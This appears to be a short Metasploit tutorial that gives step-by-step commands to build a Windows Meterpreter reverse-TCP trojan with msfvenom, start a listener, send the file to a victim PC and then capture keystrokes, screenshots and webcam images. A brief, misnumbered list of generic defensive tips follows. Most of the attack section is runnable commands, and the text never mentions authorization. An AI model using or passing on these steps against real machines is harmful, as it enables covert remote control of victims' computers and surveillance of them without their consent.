 Metasploit Tool:

System Security by using metasploit Tool :

1.patch to avoid these type of attacks
            Hacker Machine : Kali Linux
            Victim machine : Windows XP / Windows 7.
----------------------------------------------------------------------------------------------------------------------------------------------------------
Steps to perform attack:
1.Open Terminal in Kali Linux and create a Trojan by using below command

( msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=192.168.0.109
 <IP address of Kali> LPORT=4444 ‐o /root/Desktop/sampletest.exe ).

2.As you can see Trojan will be created in Desktop and as seen in screen shot
   Now Open

3.Now Open Metasploit Terminal and launch by typing msfconsle command


4.Now launch the attack by entering below commands
       
      a- ( use exploit/multi/handler )
      b-( set payload windows/meterpreter/reverse_tcp )
      c-( set LHOST 192.168.  . )
      d-( set LPORT 4444 )
      e-( exploit ‐j ‐z )
                                                  as shown in the pics attached

5.Now send the Trojan file to target PC to test the system security and execute in     machine

6.Now try to execute the file in target pc and you can see the attacker machine(kali)  
   by reverse tcp payload its connected to hacker machine.

7.To see the how many sessions established in hacker machine you can use below command
                           (  sessions ‐l  )

8.Now connect to windows7 machine by using below command
                            (  sessions ‐i 1   )
9.Now execute the commands to get the keystrokes / screenshots / Webcam and etc.

10.Continue with the steps shown by the machine to complete the process.

4.Education on trojens, virus, malware
5.Keep Antivirus Protection Current
6.Utilize Anti Spam Software
7.Utilize Anti Spy Software
8.Install and maintain a reliable Firewall
9.Protect against DNS pharming attacks
10.Utilize Backup System copies
11.scan the downloded files with multiple antivirus and then only open the file.
12.clear logs from time to time
13.seek for any anonimous task scheduled in task scheduler
